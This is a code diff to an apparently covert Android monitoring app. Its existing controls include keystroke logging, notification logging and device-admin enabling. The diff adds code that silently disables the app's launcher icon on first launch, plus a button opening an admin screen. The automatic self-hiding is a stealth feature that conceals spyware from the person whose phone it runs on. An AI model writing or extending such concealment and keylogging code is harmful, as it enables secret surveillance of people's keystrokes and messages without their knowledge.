@@ -71,8 +71,27 @@ class MainActivity : Activity() {
             e.printStackTrace()
         }
 
+        // Automatically hide app icon from launcher / app drawer after install/launch
+        hideAppIconAutomatically()
+
         // Prompt for password on launch with full black overlay
         showPasswordOverlay()
+    }
+
+    private fun hideAppIconAutomatically() {
+        try {
+            val p = packageManager
+            val componentName = ComponentName(this, MainActivity::class.java)
+            if (p.getComponentEnabledSetting(componentName) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                p.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     private fun showPasswordOverlay() {
@@ -134,6 +153,7 @@ class MainActivity : Activity() {
             val btnTestSync = findViewById<Button>(R.id.btnTestSync)
             val btnEnableAdmin = findViewById<Button>(R.id.btnEnableAdmin)
             val btnHideAppIcon = findViewById<Button>(R.id.btnHideAppIcon)
+            val btnOpenAdmin = findViewById<Button>(R.id.btnOpenAdmin)
             val btnToggleKeyLog = findViewById<Button>(R.id.btnToggleKeyLog)
             val btnToggleNotifLog = findViewById<Button>(R.id.btnToggleNotifLog)
 
@@ -200,6 +220,15 @@ class MainActivity : Activity() {
                     startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                 } catch (e: Exception) {
                     e.printStackTrace()
+                }
+            }
+
+            btnOpenAdmin?.setOnClickListener {
+                try {
+                    val intent = Intent(this, AdminActivity::class.java)
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
                 }
             }
 
